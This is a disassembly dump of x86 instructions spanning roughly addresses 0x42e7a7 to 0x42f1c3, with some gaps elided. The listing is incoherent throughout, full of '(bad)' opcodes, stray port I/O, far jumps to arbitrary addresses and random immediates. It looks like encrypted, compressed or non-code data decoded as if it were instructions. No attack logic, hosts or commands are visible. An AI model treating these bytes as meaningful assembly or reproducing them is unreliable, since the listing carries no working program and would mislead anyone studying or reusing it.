  42e7a7:	hlt    
  42e7a8:	mov    ds:0xabcef828,eax
  42e7ad:	out    dx,eax
  42e7ae:	sub    al,0xab
  42e7b0:	daa    
  42e7b1:	aad    0x90
  42e7b3:	cmp    ch,BYTE PTR [ebp+0x3fba2056]
  42e7b9:	jne    0x42e73f
  42e7bb:	(bad)  
  42e7bd:	xchg   edx,eax
  42e7be:	adc    ebx,DWORD PTR [edx]
  42e7c0:	sbb    DWORD PTR [eax],eax
  42e7c2:	jmp    0x406f84aa
  42e7c7:	xor    cl,BYTE PTR [ecx+0x2be16a9d]
  42e7cd:	lods   eax,DWORD PTR ds:[esi]
  42e7ce:	jbe    0x42e823
  42e7d0:	rol    DWORD PTR [esi-0x4e],cl
  42e7d3:	and    BYTE PTR [esi+ecx*8],dh
  42e7d6:	mov    esp,es
  42e7d8:	push   edi
  42e7d9:	retf   0x4a21
  42e7dc:	jne    0x42e7e2
  42e7de:	sub    ecx,DWORD PTR ds:0x1135681d
  42e7e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e7e5:	mov    esp,0x91737a93
  42e7ea:	not    edi
  42e7ec:	push   0x3d29e592
  42e7f1:	addr16 push ecx
  42e7f3:	adc    eax,0x50cc44d4
  42e7f8:	js     0x42e780
  42e7fa:	sti    
  42e7fb:	xor    ah,0x96
  42e7fe:	and    DWORD PTR [ebx+0x62],edx
  42e801:	cmc    
  42e802:	dec    edx
  42e803:	pop    edx
  42e804:	in     al,0x49
  42e806:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e807:	pop    eax
  42e808:	pop    esp
  42e809:	push   0x86b84b3e
  42e80e:	xor    esi,0x17
  42e811:	(bad)  
  42e812:	out    0xda,eax
  42e814:	bound  ebx,QWORD PTR ds:0xeb2270b4
  42e81a:	sub    BYTE PTR [edx],al
  42e81c:	push   ds
  42e81d:	jnp    0x42e7aa
  42e81f:	test   BYTE PTR [esi],al
  42e821:	sub    ebx,edi
  42e823:	xor    edi,DWORD PTR [esi-0x41]
  42e826:	arpl   WORD PTR ds:0xd4d07cbe,dx
  42e82c:	fnsave [eax]
  42e82e:	mov    cl,0x28
  42e830:	mov    cl,BYTE PTR [ebp+0x92a5af]
	...
  42e896:	ret    
  42e897:	ja     0x42e8f9
  42e899:	and    al,0xf4
  42e89b:	aaa    
  42e89c:	(bad)  
  42e89d:	div    DWORD PTR [ebp+0x56f13c3]
  42e8a3:	or     dl,BYTE PTR [esi+ebp*2-0x4f]
  42e8a7:	repnz add DWORD PTR [eax],eax
  42e8aa:	pop    es
  42e8ab:	add    DWORD PTR [eax],eax
  42e8ad:	add    BYTE PTR [ebp+eax*1-0x43266c9c],dl
  42e8b4:	xchg   edi,eax
  42e8b5:	das    
  42e8b6:	out    0x1,eax
  42e8b8:	sbb    ah,BYTE PTR [edi-0x6e]
  42e8bb:	and    DWORD PTR ds:0x8a7704f2,ebp
  42e8c1:	sbb    eax,0x683d343d
  42e8c6:	and    eax,0xa565d77
  42e8cb:	mov    ds:0x4eda391f,al
  42e8d0:	and    al,0xbf
  42e8d2:	fld    QWORD PTR [ebx+esi*2]
  42e8d5:	dec    ebp
  42e8d6:	jmp    0x42e879
  42e8d8:	mov    ah,0x38
  42e8da:	imul   ebp,ebp,0x9e0a2f1c
  42e8e0:	sbb    BYTE PTR [ecx-0x15dffc8a],al
  42e8e6:	shl    ah,0x9b
  42e8e9:	(bad)  
  42e8ea:	or     eax,0x7df99502
  42e8ef:	fs mov ch,0x62
  42e8f2:	jmp    0x42e875
  42e8f4:	xchg   BYTE PTR [esi-0x585f9320],bh
  42e8fa:	ss mov al,0x2
  42e8fd:	or     BYTE PTR [eax],0x54
  42e900:	mov    edi,0x2dab7274
  42e905:	adc    eax,0xfa99f9b7
  42e90a:	adc    dh,BYTE PTR [ebp+esi*4-0x51]
  42e90e:	bound  ebx,QWORD PTR [edi]
  42e910:	mul    ch
  42e912:	mov    ebp,0x3d80d55b
  42e917:	xchg   esp,eax
  42e918:	std    
  42e919:	mov    ecx,0xf7f08974
  42e91e:	mov    WORD PTR [eax+edi*8-0x492e3fcf],es
  42e925:	fistp  WORD PTR [eax-0x3076c7b9]
  42e92b:	sahf   
  42e92c:	scas   eax,DWORD PTR es:[edi]
  42e92d:	rol    eax,0xa7
  42e930:	jae    0x42e902
  42e932:	ins    BYTE PTR es:[edi],dx
  42e933:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e934:	into   
  42e935:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e936:	(bad)
  42e939:	gs fld1 
  42e93c:	xchg   ebx,eax
  42e93d:	sbb    bh,BYTE PTR [ecx+edi*4]
  42e940:	stc    
  42e941:	das    
  42e942:	int3   
  42e943:	xor    eax,0x46eecf1e
  42e948:	push   edx
  42e949:	or     BYTE PTR [ebx-0xe7e93e],al
  42e94f:	cmc    
  42e950:	shl    BYTE PTR [ebx+0xc9b0dae],0xcb
  42e957:	aaa    
  42e958:	push   ss
  42e959:	jae    0x42e8ef
  42e95b:	fisub  WORD PTR [ebx-0x2f053bb7]
  42e961:	adc    al,0x9c
  42e963:	mov    edx,0x52fdb737
  42e968:	cli    
  42e969:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e96a:	add    esi,esp
  42e96c:	(bad)  
  42e96d:	clc    
  42e96e:	pop    ebp
  42e96f:	inc    ecx
  42e970:	push   ss
  42e971:	lea    esp,[edi]
  42e973:	sub    esp,DWORD PTR [ebp-0x67]
  42e976:	loop   0x42e909
  42e978:	ret    
  42e979:	xchg   BYTE PTR [edi-0x67],bl
  42e97c:	mov    dh,0xf2
  42e97e:	xor    eax,DWORD PTR [eax-0x50]
  42e981:	inc    esi
  42e982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e983:	pop    ebx
  42e984:	mov    cl,0x57
  42e986:	xchg   esp,eax
  42e987:	out    0xa2,eax
  42e989:	ret    0x786
  42e98c:	xor    edx,DWORD PTR [esi]
  42e98e:	in     eax,dx
  42e98f:	retf   0xca72
  42e992:	add    esp,0xffffffa6
  42e995:	ins    BYTE PTR es:[edi],dx
  42e996:	or     al,0x17
  42e998:	ja     0x42e9bb
  42e99a:	inc    ecx
  42e99b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e99c:	imul   BYTE PTR [ebp-0x6ad3c7e9]
  42e9a2:	fs pop esi
  42e9a4:	out    dx,al
  42e9a5:	mov    esi,DWORD PTR [ebp*2+0x284ec695]
  42e9ac:	mov    bh,0x4e
  42e9ae:	push   ss
  42e9af:	mov    bh,0xfa
  42e9b1:	cli    
  42e9b2:	call   0x0:0xc28b
	...
  42ea15:	add    ch,ah
  42ea17:	mov    edx,0xebdfe392
  42ea1c:	cmc    
  42ea1d:	mov    esi,0xe8a967c2
  42ea22:	int3   
  42ea23:	jb     0x42e9bc
  42ea25:	and    BYTE PTR [eax+0x70001f3],bh
  42ea2b:	add    DWORD PTR [eax],eax
  42ea2d:	add    ch,bh
  42ea2f:	mov    ds:0x868de0e7,eax
  42ea34:	xchg   ebp,eax
  42ea35:	gs xor dl,ch
  42ea38:	xor    dl,bl
  42ea3a:	fmul   QWORD PTR [ebx]
  42ea3c:	pop    ds
  42ea3d:	in     eax,0xf1
  42ea3f:	xor    eax,DWORD PTR [eax+0x129ea74b]
  42ea45:	cmp    edi,edi
  42ea47:	cmp    BYTE PTR [eax+0x14418a07],bl
  42ea4d:	fdivrp st(5),st
  42ea4f:	(bad)  
  42ea50:	dec    ecx
  42ea51:	shl    DWORD PTR [ebx-0xdaab05],0xd4
  42ea58:	push   ecx
  42ea59:	ins    BYTE PTR es:[edi],dx
  42ea5a:	push   ebx
  42ea5b:	mov    fs,WORD PTR [esi+0x59]
  42ea5e:	jmp    0xc7d1d39a
  42ea63:	dec    edi
  42ea64:	mov    BYTE PTR [ebp-0x75],al
  42ea67:	jmp    0x4e84764
  42ea6c:	cmp    al,0x3f
  42ea6e:	pop    ds
  42ea6f:	cld    
  42ea70:	loop   0x42ea79
  42ea72:	mov    edx,0x73e21b1c
  42ea77:	and    eax,0xbb3e5dcc
  42ea7c:	mov    dh,BYTE PTR [ebx]
  42ea7e:	mov    ebp,edx
  42ea80:	(bad)  
  42ea81:	outs   dx,DWORD PTR ds:[esi]
  42ea82:	test   BYTE PTR [ebp-0x7b],ah
  42ea85:	sub    BYTE PTR [edx+0x2f3d675a],ah
  42ea8b:	push   esi
  42ea8c:	test   ch,0x8e
  42ea8f:	mov    ch,bh
  42ea91:	ds xchg edi,eax
  42ea93:	mov    ebp,DWORD PTR [ebp-0x7a26e4c7]
  42ea99:	push   esp
  42ea9a:	cs (bad) 
  42ea9c:	and    al,0x23
  42ea9e:	mov    al,0x6f
  42eaa0:	stos   BYTE PTR es:[edi],al
  42eaa1:	or     eax,0x25a1f570
  42eaa6:	xchg   bh,dh
  42eaa8:	or     DWORD PTR [ebp+edx*4-0x53],esi
  42eaac:	cld    
  42eaad:	(bad)  [edx+ebp*2]
  42eab0:	pusha  
  42eab1:	bound  ebx,QWORD PTR [edi]
  42eab3:	xor    eax,0x36190f6b
  42eab8:	push   cs
  42eab9:	jae    0x42eaed
  42eabb:	repz cmp al,0x69
  42eabe:	adc    ebx,edi
  42eac0:	push   cs
  42eac1:	imul   ecx,ebx,0xb8f30e9e
  42eac7:	cmp    DWORD PTR [ebp-0x3d],ebp
  42eaca:	push   ebp
  42eacb:	aad    0x1c
  42eacd:	sahf   
  42eace:	shr    DWORD PTR [edx+0x583b56b6],1
  42ead4:	in     eax,0xaa
  42ead6:	mov    ebx,0x803a626f
  42eadb:	shl    BYTE PTR [eax-0x4285391],cl
  42eae1:	js     0x42ea9c
  42eae3:	push   edx
  42eae4:	push   esp
  42eae5:	sbb    eax,0xce443376
  42eaea:	cmc    
  42eaeb:	add    dh,BYTE PTR [edi]
  42eaed:	mov    bh,BYTE PTR [eax-0x102fdc54]
  42eaf3:	jns    0x42eb6e
  42eaf5:	add    cl,BYTE PTR [ebx]
  42eaf7:	jge    0x42eb41
  42eaf9:	xor    ecx,ecx
  42eafb:	cmp    ecx,0xffffff9b
  42eafe:	jle    0x42eb13
  42eb00:	mov    ebx,0x58499ffa
  42eb05:	sub    cl,BYTE PTR [eax+0x2a6d3734]
  42eb0b:	sti    
  42eb0c:	or     eax,0x72165c52
  42eb11:	push   es
  42eb12:	dec    eax
  42eb13:	jge    0x42eaa8
  42eb15:	mov    BYTE PTR [esi+eiz*8-0x10c9ba79],ch
  42eb1c:	and    DWORD PTR [esi],ebx
  42eb1e:	fpatan 
  42eb20:	test   al,0xbc
  42eb22:	and    DWORD PTR [edx-0x4d75c201],0xdf79a920
  42eb2c:	cs hlt 
  42eb2e:	pusha  
  42eb2f:	xor    al,0xb6
  42eb31:	jbe    0x42eabf
  42eb33:	push   esp
  42eb34:	aas    
	...
  42eb95:	add    BYTE PTR [esi+0x41],bh
  42eb98:	jne    0xfc41badd
  42eb9e:	add    DWORD PTR [edi+0x6e975ada],ebp
  42eba4:	mov    ds:0x1f4bfa2,al
  42eba9:	add    BYTE PTR [edi],al
  42ebab:	add    DWORD PTR [eax],eax
  42ebad:	add    BYTE PTR [ebx+ebp*4],ch
  42ebb0:	cmp    DWORD PTR [edx+0x55],eax
  42ebb3:	(bad)
  42ebb7:	push   esp
  42ebb8:	fcomp  DWORD PTR [edx-0x13]
  42ebbb:	or     edi,DWORD PTR [eax+0x1e]
  42ebbe:	sub    al,0xea
  42ebc0:	loopne 0x42eb4c
  42ebc2:	(bad)
  42ebc6:	sbb    eax,0xc890bac7
  42ebcb:	sbb    ebx,DWORD PTR [edi-0x29]
  42ebce:	inc    ebp
  42ebcf:	and    eax,DWORD PTR [ecx]
  42ebd1:	jmp    0xd4ef:0xf84bb75c
  42ebd8:	fstp   DWORD PTR [edx+0x2f10e906]
  42ebde:	rol    ch,cl
  42ebe0:	push   esi
  42ebe1:	and    eax,0xcb79f422
  42ebe6:	stos   BYTE PTR es:[edi],al
  42ebe7:	imul   esp,DWORD PTR [edx-0x792a4a28],0x4f735dd1
  42ebf1:	in     eax,dx
  42ebf2:	mov    dh,0x5d
  42ebf4:	ja     0x42ebf9
  42ebf6:	nop
  42ebf7:	retf   0x502d
  42ebfa:	or     edi,eax
  42ebfc:	(bad)  
  42ebfd:	xor    DWORD PTR [ecx+0x2b],ecx
  42ec00:	push   esp
  42ec01:	mov    ecx,esi
  42ec03:	cmp    eax,0x75c19004
  42ec08:	out    0x2e,eax
  42ec0a:	aaa    
  42ec0b:	lock and cl,ch
  42ec0e:	dec    ebx
  42ec0f:	sbb    eax,0xa6dd282d
  42ec14:	mov    DWORD PTR ds:0x94d3d6ea,edx
  42ec1a:	adc    al,0x42
  42ec1c:	adc    BYTE PTR ds:[esp+esi*8+0x32a81857],0x4
  42ec25:	lods   eax,DWORD PTR ds:[esi]
  42ec26:	cs and eax,0x86ab11d6
  42ec2c:	mov    ds:0xaee095b1,al
  42ec31:	stc    
  42ec32:	pop    ds
  42ec33:	sbb    DWORD PTR [esi],0x67
  42ec36:	test   al,0xc
  42ec38:	loopne 0x42ec11
  42ec3a:	or     al,0x68
  42ec3c:	inc    ebx
  42ec3d:	test   BYTE PTR [esp+edi*8-0x41],ch
  42ec41:	mov    ebp,0xee78c020
  42ec46:	xchg   BYTE PTR [ebx],cl
  42ec48:	adc    eax,DWORD PTR [ecx+0x1b]
  42ec4b:	aad    0x24
  42ec4d:	call   0xcf0f6e99
  42ec52:	loop   0x42ec97
  42ec54:	jp     0x42ec55
  42ec56:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ec58:	and    al,0x78
  42ec5a:	js     0x42ec3e
  42ec5c:	jns    0x42ec6b
  42ec5e:	cmp    DWORD PTR [edx-0x524d6fa4],eax
  42ec64:	js     0x42ebed
  42ec66:	jae    0x42ec6b
  42ec68:	(bad)  
  42ec6b:	fcom   QWORD PTR [esi]
  42ec6d:	sbb    eax,0xe65f7903
  42ec72:	ss ins BYTE PTR es:[edi],dx
  42ec74:	ja     0x42ec19
  42ec76:	jl     0x42ecd5
  42ec78:	pop    esi
  42ec79:	(bad)  
  42ec7a:	mov    cl,0x6f
  42ec7c:	xchg   esi,eax
  42ec7d:	and    eax,0x65c2b21a
  42ec82:	pusha  
  42ec83:	or     al,0xc1
  42ec85:	or     eax,0xb3e7b818
  42ec8a:	sti    
  42ec8b:	fiadd  WORD PTR [esi-0x57]
  42ec8e:	out    0x50,eax
  42ec90:	dec    ebp
  42ec91:	push   ss
  42ec92:	fwait
  42ec93:	mov    eax,0xa0c6e84
  42ec98:	and    DWORD PTR [ebx+0x79a0116a],eax
  42ec9e:	or     al,0x2d
  42eca0:	mov    ah,0x4
  42eca2:	iret   
  42eca3:	mov    edi,0x1471f458
  42eca8:	test   BYTE PTR [esi-0x8],bh
  42ecab:	outs   dx,DWORD PTR ds:[esi]
  42ecac:	stos   DWORD PTR es:[edi],eax
  42ecad:	push   edi
  42ecae:	inc    ebp
  42ecaf:	and    eax,0x1ed8ec30
  42ecb4:	mov    es,WORD PTR [eax]
	...
  42ed16:	sub    dh,dh
  42ed18:	scas   eax,DWORD PTR es:[edi]
  42ed19:	fdivr  st,st(7)
  42ed1b:	fnstcw WORD PTR [edi-0xa]
  42ed1e:	mov    esi,0x5cf0a17f
  42ed23:	mov    eax,ecx
  42ed25:	mov    eax,ds:0x1f5c6
  42ed2a:	pop    es
  42ed2b:	add    DWORD PTR [eax],eax
  42ed2d:	add    BYTE PTR [ebp+0x2d882eb9],dl
  42ed33:	dec    ebp
  42ed34:	pop    si
  42ed36:	xor    al,0x48
  42ed38:	add    DWORD PTR [ebx],0xe4e380b4
  42ed3e:	xchg   edx,eax
  42ed3f:	dec    esi
  42ed40:	rol    DWORD PTR [ebp+0x15fa8dc3],0xdf
  42ed47:	mov    bl,BYTE PTR [eax]
  42ed49:	cmp    ebx,DWORD PTR [eax]
  42ed4b:	or     DWORD PTR [edi+0xa],esp
  42ed4e:	cmp    BYTE PTR [ecx+0x43],bh
  42ed51:	push   eax
  42ed52:	nop
  42ed53:	pop    ebx
  42ed54:	(bad)  
  42ed55:	mov    esi,0x55967881
  42ed5a:	or     ebp,DWORD PTR [ecx-0x3212756c]
  42ed60:	mov    ds:0xd27c3da5,al
  42ed65:	dec    ebx
  42ed66:	mov    ch,0x63
  42ed68:	das    
  42ed69:	jo     0x42ed52
  42ed6b:	pop    ss
  42ed6c:	cld    
  42ed6d:	mov    DWORD PTR [edx+0x75],ecx
  42ed70:	bound  ebx,QWORD PTR [edi+eax*8-0x2d]
  42ed74:	retf   0xc6f3
  42ed77:	je     0x42edd5
  42ed79:	adc    al,0x7a
  42ed7b:	cdq    
  42ed7c:	jo     0x42ed61
  42ed7e:	rcl    BYTE PTR ds:0x9cd63d10,1
  42ed84:	xor    eax,0xe41faadf
  42ed89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ed8a:	jge    0x42ed8d
  42ed8c:	pop    edi
  42ed8d:	sbb    eax,0x702295b9
  42ed92:	shl    BYTE PTR [esi-0x78],1
  42ed95:	add    ah,bl
  42ed97:	adc    edx,eax
  42ed99:	inc    ecx
  42ed9a:	imul   al
  42ed9c:	push   esp
  42ed9d:	js     0x42ed72
  42ed9f:	and    eax,0xa05b61f4
  42eda4:	and    BYTE PTR [eax+0x43],0x99
  42eda8:	jno    0x42ed39
  42edaa:	out    0x68,al
  42edac:	dec    esp
  42edad:	cmp    BYTE PTR [edx-0xa],0x53
  42edb1:	jne    0x42ee08
  42edb3:	xchg   ebp,eax
  42edb4:	ret    0x127e
  42edb7:	pop    edi
  42edb8:	sti    
  42edb9:	lds    esp,FWORD PTR [edx]
  42edbb:	pop    ebx
  42edbc:	sar    DWORD PTR [edx],0x5c
  42edbf:	imul   eax,ebp,0xa8808363
  42edc5:	dec    edi
  42edc6:	xor    eax,0x21f33703
  42edcb:	mov    ecx,0x5b08d44c
  42edd0:	xor    al,0x8d
  42edd2:	jecxz  0x42edaa
  42edd4:	int3   
  42edd5:	add    DWORD PTR [ecx-0x40],ecx
  42edd8:	(bad)  
  42edd9:	jecxz  0x42ee02
  42eddb:	idiv   edx
  42eddd:	frstor [eax]
  42eddf:	out    dx,al
  42ede0:	xchg   ch,ah
  42ede2:	sahf   
  42ede3:	jne    0x42ed9e
  42ede5:	xchg   ebx,eax
  42ede6:	sbb    dh,BYTE PTR [ebp+0x29]
  42ede9:	inc    esi
  42edea:	mov    bh,0xd2
  42edec:	sbb    dl,cl
  42edee:	jno    0x42ee55
  42edf0:	sub    DWORD PTR [eax],edx
  42edf2:	jns    0x42edcc
  42edf4:	cmp    esp,DWORD PTR ds:0x3184aafa
  42edfa:	inc    esi
  42edfb:	out    0xd,al
  42edfd:	pop    esi
  42edfe:	inc    bl
  42ee00:	jp     0x42edaf
  42ee02:	popa   
  42ee03:	push   cs
  42ee04:	repnz xor al,0x6c
  42ee07:	xlat   BYTE PTR ds:[ebx]
  42ee08:	iret   
  42ee09:	mov    ecx,0xa85974e4
  42ee0e:	or     BYTE PTR ds:0xbcc377e2,cl
  42ee14:	mov    al,ds:0x8f954c6
  42ee19:	mov    al,0xa0
  42ee1b:	and    eax,0x53efdcae
  42ee20:	pop    ebx
  42ee21:	xchg   ebx,edx
  42ee23:	aam    0x56
  42ee25:	lahf   
  42ee26:	jnp    0x42ee91
  42ee28:	les    ebx,FWORD PTR ds:0x9265f935
  42ee2e:	mov    ds,esp
  42ee30:	xchg   edx,eax
  42ee31:	xchg   esi,eax
  42ee32:	aam    0x9f
  42ee34:	jecxz  0x42ee36
	...
  42ee96:	ret    
  42ee97:	add    cl,BYTE PTR [eax]
  42ee99:	xor    eax,0xf6ff3fc9
  42ee9e:	sub    DWORD PTR ds:0x9fb2f479,edi
  42eea4:	push   es
  42eea5:	daa    
  42eea6:	int    0xf6
  42eea8:	add    DWORD PTR [eax],eax
  42eeaa:	pop    es
  42eeab:	add    DWORD PTR [eax],eax
  42eead:	add    dl,dl
  42eeaf:	sub    dl,0xc0
  42eeb2:	or     DWORD PTR [ebx-0x50],edi
  42eeb5:	(bad)  
  42eeb6:	and    BYTE PTR [ecx],cl
  42eeb8:	shl    BYTE PTR [ecx],1
  42eeba:	sbb    cl,bl
  42eebc:	test   ecx,edx
  42eebe:	dec    ebx
  42eebf:	jp     0x42ee59
  42eec1:	fild   QWORD PTR [ecx+0x65]
  42eec4:	int    0xb3
  42eec6:	mov    esi,0xc2328e6b
  42eecb:	sub    cl,bh
  42eecd:	cmp    dl,ch
  42eecf:	add    dh,BYTE PTR [edx-0x32827d84]
  42eed5:	(bad)  
  42eed6:	ds and eax,0x66e61876
  42eedc:	mov    edx,0xb3ac48f9
  42eee1:	pop    ecx
  42eee2:	jb     0x42eef8
  42eee4:	jb     0x42ee69
  42eee6:	mov    esi,0xe812ebf1
  42eeeb:	dec    ebx
  42eeec:	xor    al,0x44
  42eeee:	mov    ah,0x7b
  42eef0:	cs pop eax
  42eef2:	mov    ecx,0x3a479cfb
  42eef7:	test   DWORD PTR [esi+ebp*2-0x1b],esi
  42eefb:	les    eax,FWORD PTR [ecx-0x9b24046]
  42ef01:	shl    DWORD PTR [ecx],cl
  42ef03:	scas   al,BYTE PTR es:[edi]
  42ef04:	adc    edx,eax
  42ef06:	call   FWORD PTR [esp+ebx*1]
  42ef09:	cdq    
  42ef0a:	(bad)  
  42ef0b:	hlt    
  42ef0c:	ss fs dec edi
  42ef0f:	pop    es
  42ef10:	inc    edx
  42ef11:	fimul  DWORD PTR [ebx-0x5f]
  42ef14:	fidivr DWORD PTR [esi-0x2cba4d89]
  42ef1a:	mov    esi,DWORD PTR [ebp+0x5ea2a719]
  42ef20:	push   0xffffffcf
  42ef22:	cdq    
  42ef23:	jle    0x42eec4
  42ef25:	jae    0x42eea8
  42ef27:	sub    DWORD PTR [edx+0x4d4f1ce9],edx
  42ef2d:	ins    DWORD PTR es:[edi],dx
  42ef2e:	xchg   bh,ch
  42ef30:	cmp    dh,dh
  42ef32:	rcl    BYTE PTR [ebx+0x3a15927f],1
  42ef38:	not    DWORD PTR [edx-0x6d3df27b]
  42ef3e:	and    ebx,DWORD PTR [edx+0x15be178c]
  42ef44:	int3   
  42ef45:	inc    edi
  42ef46:	mov    ebx,DWORD PTR [edx]
  42ef48:	cmp    eax,0x4f563551
  42ef4d:	lods   al,BYTE PTR ds:[esi]
  42ef4e:	push   ebp
  42ef4f:	inc    esp
  42ef50:	xchg   DWORD PTR [ecx+0x78],ecx
  42ef53:	mov    eax,ss:0xd174e16e
  42ef59:	stos   BYTE PTR es:[edi],al
  42ef5a:	mov    dh,0xe6
  42ef5c:	pop    edi
  42ef5d:	push   0x3d
  42ef5f:	xchg   ebx,eax
  42ef60:	dec    ebp
  42ef61:	jmp    0x3ede:0x2d557aa
  42ef68:	cmp    DWORD PTR [edi],ecx
  42ef6a:	adc    ecx,DWORD PTR [eax]
  42ef6c:	mov    dh,BYTE PTR [eax-0x75fc1045]
  42ef72:	sub    edi,edi
  42ef74:	es js  0x42ef49
  42ef77:	scas   eax,DWORD PTR es:[edi]
  42ef78:	add    al,bh
  42ef7a:	cmp    al,0xce
  42ef7c:	or     al,0x7b
  42ef7e:	mov    ebp,0x88a147a5
  42ef83:	jne    0x42efe6
  42ef85:	sbb    BYTE PTR [eax],al
  42ef87:	mov    dh,0xcc
  42ef89:	cmp    DWORD PTR [esi+eiz*4],0xffffffc5
  42ef8d:	int3   
  42ef8e:	(bad)
  42ef91:	pop    esp
  42ef92:	mov    bl,0xe0
  42ef94:	push   ds
  42ef95:	and    ch,BYTE PTR [esi-0x61e31fe5]
  42ef9b:	dec    edi
  42ef9c:	cmp    BYTE PTR [ebp+0x6d],dh
  42ef9f:	push   ebp
  42efa0:	sbb    DWORD PTR [edx],ebp
  42efa2:	cdq    
  42efa3:	sub    eax,0x2cd4305
  42efa8:	xor    eax,0xeff8f322
  42efad:	or     BYTE PTR [edx-0x3a],0x8a
  42efb1:	or     eax,ecx
  42efb3:	and    esi,DWORD PTR [ebx+0x0]
	...
  42f015:	add    BYTE PTR [edx],dl
  42f017:	ds int 0xe5
  42f01a:	in     eax,dx
  42f01b:	idiv   DWORD PTR [edx]
  42f01d:	call   edx
  42f01f:	sbb    eax,0x9429d516
  42f024:	arpl   WORD PTR [ebp-0x2c],di
  42f027:	test   DWORD PTR [ecx],0x10700
  42f02d:	add    al,cl
  42f02f:	push   eax
  42f030:	fadd   DWORD PTR [eax+0x25]
  42f033:	sub    BYTE PTR [ecx],ch
  42f035:	iret   
  42f036:	imul   eax
  42f038:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f039:	scas   al,BYTE PTR es:[edi]
  42f03a:	push   cs
  42f03b:	mov    eax,0x93e58978
  42f040:	add    eax,0x16dcb952
  42f045:	xlat   BYTE PTR ds:[ebx]
  42f046:	push   ecx
  42f047:	out    0x90,eax
  42f049:	loopne 0x42f02f
  42f04b:	ret    
  42f04c:	bound  ebp,QWORD PTR [ebp+0xa559e85]
  42f052:	sbb    eax,0x1c355c1e
  42f057:	in     eax,0x6
  42f059:	xor    dh,cl
  42f05b:	xchg   edi,eax
  42f05c:	cli    
  42f05d:	add    ah,BYTE PTR [edx+0x5c]
  42f060:	out    dx,al
  42f061:	sbb    dl,BYTE PTR [eax+0x9]
  42f064:	pop    ss
  42f065:	xchg   edi,eax
  42f066:	shl    BYTE PTR [eax+0x3d],0xdb
  42f06a:	mov    eax,DWORD PTR [eax-0x3030ac01]
  42f070:	adc    ch,BYTE PTR [ecx+0x746372b1]
  42f076:	lods   al,BYTE PTR ds:[esi]
  42f077:	sar    DWORD PTR [esi-0x6a],1
  42f07a:	test   BYTE PTR [ecx-0x3890c5d6],ah
  42f080:	outs   dx,DWORD PTR ds:[esi]
  42f081:	cmp    BYTE PTR [eax+0xf],al
  42f084:	call   0x4e1aa778
  42f089:	xchg   ebp,eax
  42f08a:	xor    al,BYTE PTR [ebx+ecx*4+0x33e76919]
  42f091:	test   eax,0x48fa7e3e
  42f096:	test   DWORD PTR ds:0x7864701d,ecx
  42f09c:	and    dl,cl
  42f09e:	or     BYTE PTR [ecx+0x5524f028],dl
  42f0a4:	test   BYTE PTR [edx],0x1f
  42f0a7:	dec    ecx
  42f0a8:	or     esi,esp
  42f0aa:	mov    al,ds:0x4d104819
  42f0af:	sbb    BYTE PTR [edx+0x487e27a8],0x1b
  42f0b6:	jecxz  0x42f0f2
  42f0b8:	jp     0x42f0c0
  42f0ba:	scas   eax,DWORD PTR es:[edi]
  42f0bb:	pop    edx
  42f0bc:	cli    
  42f0bd:	mov    ch,BYTE PTR [ebx+0x13]
  42f0c0:	xchg   ebx,eax
  42f0c1:	add    ebx,DWORD PTR [edi+0x1c]
  42f0c4:	jbe    0x42f081
  42f0c6:	mov    bl,0x14
  42f0c8:	je     0x42f04a
  42f0ca:	lock push edx
  42f0cc:	mov    al,ds:0x2573048e
  42f0d1:	es mov esp,0x52bce50d
  42f0d7:	xchg   DWORD PTR [esi-0x2ea7aa2d],ebp
  42f0dd:	add    edi,esi
  42f0df:	add    al,0xc
  42f0e1:	stos   DWORD PTR es:[edi],eax
  42f0e2:	(bad)  
  42f0e3:	out    0x64,al
  42f0e5:	pop    ss
  42f0e6:	dec    edx
  42f0e7:	push   esi
  42f0e8:	jne    0x42f0a0
  42f0ea:	dec    edi
  42f0eb:	and    eax,0x4b453b56
  42f0f0:	or     edx,esi
  42f0f2:	dec    edx
  42f0f4:	pop    edx
  42f0f5:	div    BYTE PTR ds:0xfeceb752
  42f0fb:	imul   esp,edi,0x74
  42f0fe:	ret    
  42f0ff:	jmp    0xc546d62b
  42f104:	push   cs
  42f105:	jo     0x42f0db
  42f107:	mov    ds:0x98c6879c,al
  42f10c:	icebp  
  42f10d:	inc    ebp
  42f10e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f10f:	mov    ebp,0x1b589fd0
  42f114:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f115:	jo     0x42f179
  42f117:	mov    bl,0x43
  42f119:	lods   eax,DWORD PTR ds:[esi]
  42f11a:	(bad)  
  42f11b:	neg    eax
  42f11d:	pop    eax
  42f11e:	pop    edi
  42f11f:	lock push 0xffffffa2
  42f122:	ins    DWORD PTR es:[edi],dx
  42f123:	(bad)  
  42f124:	in     al,dx
  42f125:	lods   eax,DWORD PTR ds:[esi]
  42f126:	jmp    0x42f14b
  42f128:	mov    BYTE PTR [ebp-0x4f3b531a],al
  42f12e:	jb     0x42f132
  42f130:	xor    bh,BYTE PTR [eax+eax*2+0xd5c0]
	...
  42f193:	add    BYTE PTR [eax],al
  42f195:	add    BYTE PTR [edx+0x26],bl
  42f198:	jecxz  0x42f1dd
  42f19a:	inc    edi
  42f19c:	cli    
  42f19d:	aas    
  42f19e:	clc    
  42f19f:	fdivr  st(3),st
  42f1a1:	jne    0x42f189
  42f1a3:	ss inc eax
  42f1a5:	neg    bl
  42f1a7:	clc    
  42f1a8:	add    DWORD PTR [eax],eax
  42f1aa:	pop    es
  42f1ab:	add    DWORD PTR [eax],eax
  42f1ad:	add    BYTE PTR [esi],dl
  42f1af:	(bad)  
  42f1b0:	fst    st(4)
  42f1b2:	(bad)  
  42f1b3:	fwait
  42f1b4:	xor    BYTE PTR [edi],dl
  42f1b6:	pop    esp
  42f1b7:	(bad)  [ebx+0x3d]
  42f1ba:	rol    BYTE PTR [ecx+0x1],cl
  42f1bd:	in     eax,dx
  42f1be:	dec    ecx
  42f1bf:	(bad)  
  42f1c0:	fcmove st,st(6)
  42f1c2:	push   ebp
  42f1c3:	add    dl,BYTE PTR [edx]
